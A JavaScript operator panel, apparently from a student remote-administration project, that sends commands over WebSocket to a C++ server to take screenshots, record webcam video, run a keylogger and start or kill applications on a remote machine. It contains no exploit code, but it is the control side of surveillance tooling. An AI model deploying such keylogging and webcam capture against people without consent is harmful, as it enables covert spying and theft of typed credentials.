// KẾT NỐI WEBSOCKET
let ws = new WebSocket("ws://192.168.2.152:9000"); 
ws.binaryType = "arraybuffer";

let flag = -1; // -1: Msg thường, 1: Screenshot, 2: Webcam, 3: Keylog Start, 4: Keylog Stop

// --- XỬ LÝ SỰ KIỆN TAB ---
function switchTab(tabId) {
    // Xóa class active ở tất cả tab
    document.querySelectorAll('.content-section').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.nav-links li').forEach(el => el.classList.remove('active'));

    // Thêm class active cho tab được chọn
    document.getElementById('tab-' + tabId).classList.add('active');
    
    // Highlight sidebar (cách đơn giản: tìm theo text hoặc index, ở đây mình dùng onclick trong HTML set trực tiếp)
    // Code CSS handles :active state via class addition logic if needed
    event.currentTarget.classList.add('active');
}

// --- WEBSOCKET HANDLERS ---

ws.onopen = () => {
    document.getElementById("connectionStatus").innerHTML = "🟢 Connected";
    document.getElementById("connectionStatus").style.color = "#28a745";
    console.log("Connected to Server");
};

ws.onclose = () => {
    document.getElementById("connectionStatus").innerHTML = "🔴 Disconnected";
    document.getElementById("connectionStatus").style.color = "#dc3545";
};

ws.onmessage = (event) => {
    // 1. XỬ LÝ DỮ LIỆU NHỊ PHÂN (ẢNH/VIDEO)
    if (event.data instanceof ArrayBuffer) {
        if (flag == 1) { // SCREENSHOT
            console.log("Received Screenshot");
            const blob = new Blob([event.data], { type: "image/bmp" });
            const url = URL.createObjectURL(blob);
            
            const container = document.getElementById("screenshotContainer");
            container.innerHTML = ""; // Xóa nội dung cũ
            const img = document.createElement("img");
            img.src = url;
            container.appendChild(img);
        } 
        else if (flag == 2) { // WEBCAM
            console.log("Received Video");
            const blob = new Blob([event.data], { type: 'video/mp4' });
            const videoUrl = URL.createObjectURL(blob);
            
            const videoPlayer = document.getElementById('videoPlayer');
            if (videoPlayer.src) URL.revokeObjectURL(videoPlayer.src);
            
            videoPlayer.src = videoUrl;
            videoPlayer.play().catch(e => console.error("Auto-play error:", e));
        }
        flag = -1; // Reset
    } 
    // 2. XỬ LÝ DỮ LIỆU VĂN BẢN
    else {
        HandleClientMSG(event.data);
    }
};

function HandleClientMSG(data) {
    // Logic xác định loại dữ liệu tiếp theo
    if (data == "screenshot") { flag = 1; return; }
    if (data == "webcam") { flag = 2; return; }
    if (data == "Keylogging started") { 
        flag = 3; 
        logKeyToConsole(">>> Keylogger Started");
        return; 
    }
    if (data == "Keylogging stopped") { 
        flag = 4; 
        logKeyToConsole(">>> Keylogger Stopped");
        return; 
    }

    // XỬ LÝ DỮ LIỆU NỘI DUNG (Content Payload)
    
    // Nếu đang ở trạng thái Keylog (flag 3 hoặc 4 chỉ báo hiệu start/stop, 
    // nhưng nếu server gửi key thật sự thì cần check logic server của bạn gửi key như nào.
    // Giả sử server gửi key text trực tiếp khi flag đang active hoặc gửi gói tin text:
    
    // Tạm thời: Nếu dữ liệu không phải command flag, ta check xem nó là list app hay keylog
    
    // Nếu dữ liệu có nhiều dòng, khả năng cao là List App
    if (data.includes(".exe") || data.includes("\n")) {
        renderAppListToTable(data);
    } 
    else {
        // Mặc định ném vào console log keylog nếu không phải các trường hợp trên
        logKeyToConsole(data);
    }
    
    // Reset flag nếu cần (tùy logic server C++ của bạn gửi theo cặp header-body hay stream)
    if (flag != 3) flag = -1; 
}

// --- CÁC HÀM CHỨC NĂNG ---

// 1. APP MANAGER
function listApp() {
    if (ws.readyState === WebSocket.OPEN) ws.send("list_apps");
}

function renderAppListToTable(dataString) {
    const tbody = document.getElementById("appListBody");
    tbody.innerHTML = ""; // Clear cũ

    // Giả sử server gửi về dạng: "chrome.exe\nnotepad.exe\n..."
    const apps = dataString.split('\n'); 

    apps.forEach(app => {
        if (app.trim().length > 0) {
            const tr = document.createElement("tr");
            
            // Cột Tên
            const tdName = document.createElement("td");
            tdName.textContent = app;
            
            // Cột Hành động
            const tdAction = document.createElement("td");
            
            // Nút Start
            const btnStart = document.createElement("button");
            btnStart.className = "btn btn-success";
            btnStart.style.marginRight = "5px";
            btnStart.innerText = "Start";
            btnStart.onclick = () => sendCommand("start_app:" + app.trim());

            // Nút Stop
            const btnStop = document.createElement("button");
            btnStop.className = "btn btn-danger";
            btnStop.innerText = "End";
            btnStop.onclick = () => sendCommand("stop_app:" + app.trim());

            tdAction.appendChild(btnStart);
            tdAction.appendChild(btnStop);
            
            tr.appendChild(tdName);
            tr.appendChild(tdAction);
            tbody.appendChild(tr);
        }
    });
}

function manualStart() {
    const name = document.getElementById("manualAppName").value;
    if(name) sendCommand("start_app:" + name);
}
function manualStop() {
    const name = document.getElementById("manualAppName").value;
    if(name) sendCommand("stop_app:" + name);
}

// 2. KEYLOG
function startkeyLog() { sendCommand("start_keylog"); }
function stopkeyLog() { sendCommand("stop_keylog"); }

function logKeyToConsole(msg) {
    const consoleBox = document.getElementById("keylogConsole");
    const span = document.createElement("span");
    span.className = "console-line";
    span.innerText = msg;
    consoleBox.appendChild(span);
    consoleBox.scrollTop = consoleBox.scrollHeight; // Auto scroll xuống dưới
}

function clearConsole() {
    document.getElementById("keylogConsole").innerHTML = '<span class="console-line">Console cleared.</span>';
}

// 3. MEDIA COMMANDS
function screenShot() { sendCommand("screenshot"); }
function webCam() { sendCommand("webcam"); }

// HÀM GỬI LỆNH CHUNG
function sendCommand(cmd) {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(cmd);
        console.log("Sent:", cmd);
    } else {
        alert("Server chưa kết nối!");
    }
}